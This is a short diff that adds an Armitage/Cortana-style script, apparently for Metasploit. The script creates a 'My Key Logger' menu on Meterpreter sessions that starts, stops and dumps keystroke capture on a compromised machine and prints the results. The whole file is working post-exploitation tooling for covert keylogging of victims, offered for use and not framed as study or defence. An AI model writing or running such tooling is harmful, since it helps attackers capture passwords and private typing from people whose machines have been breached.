@@ -1,0 +1,22 @@
+popup meterpreter_bottom {
+menu "&My Key Logger" {
+item "&Start Key Logger" {
+m_cmd($1, "keyscan_start");
+}
+item "&Stop Key Logger" {
+m_cmd($1, "keyscan_stop");
+}
+item "&Show Keylogs" {
+m_cmd($1, "keyscan_dump");
+}
+on meterpreter_keyscan_start {
+println(" $3 ");
+}
+on meterpreter_keyscan_stop {
+println(" $3 ");
+}
+on meterpreter_keyscan_dump {
+println(" $3 ");
+}
+}
+}
